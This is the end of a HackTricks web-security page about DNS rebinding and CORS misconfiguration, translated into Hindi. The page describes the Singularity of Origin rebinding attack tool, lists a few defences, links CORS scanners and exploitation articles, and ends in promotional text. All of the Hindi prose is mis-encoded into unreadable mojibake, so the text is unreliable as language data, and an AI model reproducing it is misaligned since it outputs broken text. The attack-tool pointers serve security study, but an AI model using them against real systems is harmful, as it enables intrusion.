рдЖрдк рдкрд┐рдЫрд▓реЗ рдмрд╛рдпрдкрд╛рд╕ рддрдХрдиреАрдХреЛрдВ рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЗрд╕ рдЯреЙрдХ рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ)ред

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding) рд╣рдорд▓реЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рдпрд╣ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ DNS рдирд╛рдо рдХреЗ IP рдкрддреЗ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдорд╢реАрди рдХреЗ IP рдкрддреЗ рдкрд░ рдкреБрдирдГ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ рдФрд░ рд▓рдХреНрд╖рд┐рдд рдорд╢реАрди рдкрд░ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЛ рдЙрддреНрдХреГрд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓реЗ рдХреЗ рдкреЗрдпрд▓реЛрдб рд╕реЗрд╡ рдХрд░рдиреЗ рдХреЗ рдЖрд╡рд╢реНрдпрдХ рдШрдЯрдХ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред

### DNS Rebinding рдХреЗ рд╡рд┐рд░реБрджреНрдз рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реБрд░рдХреНрд╖рд╛

* рдЖрдВрддрд░рд┐рдХ рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ TLS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
* рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ
* рд╣реЛрд╕реНрдЯ рд╣реЗрдбрд░ рдХреЛ рдорд╛рдиреНрдпрддрд╛ рджреЗрдВ
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): рдкреНрд░рд╕реНрддрд╛рд╡ рдЬрдм рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд╕рд░реНрд╡рд░ рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░реЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рд╣рдореЗрд╢рд╛ рдПрдХ рдкреВрд░реНрд╡-рдЙрдбрд╝рд╛рди рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП

## **рдЙрдкрдХрд░рдг**

**CORS рдиреАрддрд┐рдпреЛрдВ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдвреВрдВрдвреЗрдВ**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)


<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
